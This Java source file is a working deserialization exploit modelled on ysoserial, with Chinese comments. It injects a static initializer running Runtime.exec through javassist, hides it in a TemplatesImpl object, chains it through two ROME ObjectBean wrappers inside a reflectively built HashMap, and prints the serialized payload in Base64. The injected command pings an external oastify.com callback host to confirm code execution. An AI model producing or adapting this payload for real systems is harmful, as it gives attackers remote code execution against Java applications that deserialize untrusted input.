import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import com.sun.syndication.feed.impl.ObjectBean;
import javassist.ClassPool;
import javassist.CtClass;
import javax.xml.transform.Templates;
import java.util.Base64;

public class YsoEXP {
    public static class StaticBlock { }
    public static void main(String[] args) throws Exception{
        // 生成恶意 bytecodes
        String code = "{java.lang.Runtime.getRuntime().exec(\"ping t2w5zvhchpj5hlse6dwpilvip9v1jq.oastify.com\");}";
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(StaticBlock.class.getName());
        clazz.setSuperclass(pool.get(Class.forName("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet").getName()));
        clazz.makeClassInitializer().insertBefore(code);
        byte[][] bytecodes = new byte[][]{clazz.toBytecode()};

        // 实例化类并设置属性
        TemplatesImpl templatesimpl = new TemplatesImpl();
        Field fieldByteCodes = templatesimpl.getClass().getDeclaredField("_bytecodes");
        fieldByteCodes.setAccessible(true);
        fieldByteCodes.set(templatesimpl, bytecodes);

        Field fieldName = templatesimpl.getClass().getDeclaredField("_name");
        fieldName.setAccessible(true);
        fieldName.set(templatesimpl, "test");

        Field fieldTfactory = templatesimpl.getClass().getDeclaredField("_tfactory");
        fieldTfactory.setAccessible(true);
        fieldTfactory.set(templatesimpl, Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl").newInstance());

        // 要通过2个objectbean才能达成触发条件
        ObjectBean objectBean1 = new ObjectBean(Templates.class, templatesimpl);
        ObjectBean objectBean2 = new ObjectBean(ObjectBean.class, objectBean1);

        // 设置hashmap，参考ysoserial
        HashMap hashmap = new HashMap();
        Field fieldsize = hashmap.getClass().getDeclaredField("size");
        fieldsize.setAccessible(true);
        fieldsize.set(hashmap,2);
        Class nodeC = Class.forName("java.util.HashMap$Node");
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);
//        Object tbl = Array.newInstance(nodeC, 2); 也可以只写入objectBean2, 就是会报错(但还是执行了命令)
        Object tbl = Array.newInstance(nodeC, 1);
//        Array.set(tbl, 0, nodeCons.newInstance(0, objectBean1, objectBean1, null));
        Array.set(tbl, 0, nodeCons.newInstance(0, objectBean2, objectBean2, null));
        Field fieldtable = hashmap.getClass().getDeclaredField("table");
        fieldtable.setAccessible(true);
        fieldtable.set(hashmap,tbl);

        // 输出base64后的序列化数据
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(byteArrayOutputStream);
        out.writeObject(hashmap);
        byte[] sss = byteArrayOutputStream.toByteArray();
        out.close();
        String exp = Base64.getEncoder().encodeToString(sss);
        System.out.println(exp);

        byte[] tempEXP = Base64.getDecoder().decode(exp);
        ByteArrayInputStream bytes = new ByteArrayInputStream(tempEXP);
        ObjectInputStream objectInputStream = new ObjectInputStream(bytes);
        objectInputStream.readObject();
    }
}